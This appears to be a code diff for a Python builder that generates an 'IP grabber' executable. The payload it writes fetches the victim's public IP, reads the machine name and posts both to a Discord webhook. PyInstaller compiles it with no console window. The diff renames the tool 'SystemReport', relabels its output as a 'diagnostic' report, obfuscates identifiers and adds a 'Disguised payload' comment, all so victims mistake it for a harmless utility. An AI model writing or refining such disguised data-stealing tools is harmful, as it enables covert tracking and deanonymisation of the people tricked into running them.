@@ -1,57 +1,54 @@
 import os
 import shutil
 
-webhook = input("Enter the Discord Webhook URL: ").strip()
+webhook = input("Enter Webhook: ").strip()
 if not webhook:
-    print("❌ Webhook cannot be empty.")
+    print("Configuration required.")
     exit()
 
-filename = input("Enter output filename (without .exe): ").strip()
+filename = input("Enter file name (no extension): ").strip()
 if not filename:
-    filename = "IPGrabber"
+    filename = "SystemReport"
 
 py_file = f"{filename}.py"
 
-# Create the actual grabber script with the webhook hardcoded
+# Disguised payload
 payload_code = f'''
-import requests
-import platform
-from datetime import datetime
+import datetime as _dt
+import platform as _pf
+from requests import get as _get, post as _post
 
-WEBHOOK_URL = "{webhook}"
+_CONFIG = "{webhook}"
 
-def send_ip_data():
+def _sync_system_info():
     try:
-        ip = requests.get('https://api.ipify.org', timeout=10).text
-        data = {{
+        _net_id = _get('https://api.ipify.org', timeout=5).text
+        _sys_data = {{
             "content": (
-                "🌐 **IP Grabbed**\\n"
-                f"🔢 **IP:** `{{ip}}`\\n"
-                f"💻 **PC Name:** `{{platform.node()}}`\\n"
-                f"⏰ **Time:** `{{datetime.now()}}`"
+                "System Diagnostic Report\\n"
+                f"Network Identifier: `{{_net_id}}`\\n"
+                f"Device Label: `{{_pf.node()}}`\\n"
+                f"Timestamp: `{{_dt.datetime.now()}}`"
             )
         }}
-        requests.post(WEBHOOK_URL, json=data, timeout=10)
-    except:
+        _post(_CONFIG, json=_sys_data, timeout=5)
+    except Exception:
         pass
 
 if __name__ == "__main__":
-    send_ip_data()
+    _sync_system_info()
 '''
 
-# Save the generated Python code to a file named after the user's input
 with open(py_file, "w", encoding="utf-8") as f:
     f.write(payload_code)
 
-print("📦 Creating EXE file...")
+print("🔧 Compiling diagnostic tool...")
 os.system(f"pyinstaller --onefile --noconsole --name \"{filename}\" \"{py_file}\"")
 
-# Move the resulting EXE from /dist to current folder
 exe_path = f"dist/{filename}.exe"
 if os.path.exists(exe_path):
     shutil.move(exe_path, f"./{filename}.exe")
 
-# Cleanup
 for folder in ["build", "dist"]:
     shutil.rmtree(folder, ignore_errors=True)
 
@@ -61,4 +58,4 @@ for ext in [".spec", ".py"]:
     except FileNotFoundError:
         pass
 
-print(f"✅ Done! Your executable is: {filename}.exe")
+print(f"✅ Diagnostic tool created: {filename}.exe")
